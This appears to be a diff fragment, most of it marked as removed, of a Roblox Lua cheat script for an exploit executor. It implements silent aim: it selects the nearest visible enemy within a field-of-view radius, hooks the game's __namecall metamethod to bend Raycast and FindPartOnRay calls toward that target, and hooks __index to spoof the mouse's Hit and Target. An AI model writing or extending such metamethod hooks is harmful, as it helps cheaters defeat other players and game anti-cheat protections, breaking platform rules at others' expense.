-                    local vector, onScreen = workspace.CurrentCamera:WorldToViewportPoint(targetPart.Position)
-                    if onScreen then
-                        local dist = (Vector2.new(vector.X, vector.Y) - mousePos).Magnitude
-                        if dist <= SA_CFG.FOVRadius and dist < shortestDistance then
-                            local isVisible = true
-
-                            if SA_CFG.WallCheck then
-                                local myHead = LPLR.Character and LPLR.Character:FindFirstChild("Head")
-                                if myHead then
-                                    local rayParams = RaycastParams.new()
-                                    rayParams.FilterType = Enum.RaycastFilterType.Exclude
-                                    rayParams.FilterDescendantsInstances = { LPLR.Character }
-                                    local result = workspace:Raycast(myHead.Position,
-                                        (targetPart.Position - myHead.Position).Unit * 1000, rayParams)
-                                    if result and result.Instance and not result.Instance:IsDescendantOf(p.Character) then
-                                        isVisible = false
-                                    end
-                                end
-                            end
-
-                            if isVisible then
-                                shortestDistance = dist
-                                bestTarget = targetPart
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        _G.EXE.SILENT_AIM_TARGET = bestTarget
-    end)
-end)
-
-if not _G.EXE.OLD_NAMECALL then
-    _G.EXE.OLD_NAMECALL = hookmetamethod(game, "__namecall", function(self, ...)
-        local method = getnamecallmethod()
-
-        if not checkcaller() and _G.EXE.SILENT_AIM and _G.EXE.SILENT_AIM.Enabled then
-            local targetPart = _G.EXE.SILENT_AIM_TARGET
-
-            if targetPart and math.random(1, 100) <= _G.EXE.SILENT_AIM.HitChance then
-                if method == "Raycast" and self == workspace then
-                    local args = { ... }
-                    local origin = args[1]
-                    local dir = args[2]
-
-                    local myChar = LPLR.Character
-                    local myHead = myChar and myChar:FindFirstChild("Head")
-                    local camPos = workspace.CurrentCamera.CFrame.Position
-
-                    local isFromPlayer = false
-                    if myHead and (origin - myHead.Position).Magnitude < 15 then isFromPlayer = true end
-                    if (origin - camPos).Magnitude < 15 then isFromPlayer = true end
-
-                    if isFromPlayer and typeof(dir) == "Vector3" and dir.Magnitude > 30 then
-                        args[2] = (targetPart.Position - origin).Unit * dir.Magnitude
-                        setnamecallmethod(method)
-                        return _G.EXE.OLD_NAMECALL(self, unpack(args))
-                    end
-                elseif (method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRay" or method == "FindPartOnRayWithWhitelist") and self == workspace then
-                    local args = { ... }
-                    local ray = args[1]
-
-                    local myChar = LPLR.Character
-                    local myHead = myChar and myChar:FindFirstChild("Head")
-                    local camPos = workspace.CurrentCamera.CFrame.Position
-
-                    local isFromPlayer = false
-                    if typeof(ray) == "Ray" then
-                        if myHead and (ray.Origin - myHead.Position).Magnitude < 15 then isFromPlayer = true end
-                        if (ray.Origin - camPos).Magnitude < 15 then isFromPlayer = true end
-
-                        if isFromPlayer and ray.Direction.Magnitude > 30 then
-                            args[1] = Ray.new(ray.Origin,
-                                (targetPart.Position - ray.Origin).Unit * ray.Direction.Magnitude)
-                            setnamecallmethod(method)
-                            return _G.EXE.OLD_NAMECALL(self, unpack(args))
-                        end
-                    end
-                end
-            end
-        end
-
-        setnamecallmethod(method)
-        return _G.EXE.OLD_NAMECALL(self, ...)
-    end)
-end
-
-if not _G.EXE.OLD_INDEX then
-    _G.EXE.OLD_INDEX = hookmetamethod(game, "__index", function(self, key)
-        if not checkcaller() and _G.EXE.SILENT_AIM and _G.EXE.SILENT_AIM.Enabled then
-            local targetPart = _G.EXE.SILENT_AIM_TARGET
-            if targetPart and self:IsA("Mouse") and (key == "Hit" or key == "Target") then
-                if math.random(1, 100) <= _G.EXE.SILENT_AIM.HitChance then
-                    if key == "Hit" then return targetPart.CFrame end
-                    if key == "Target" then return targetPart end
-                end
-            end
-        end
-        return _G.EXE.OLD_INDEX(self, key)
-    end)
-end
-
 BUILD_NYH_UI()
-
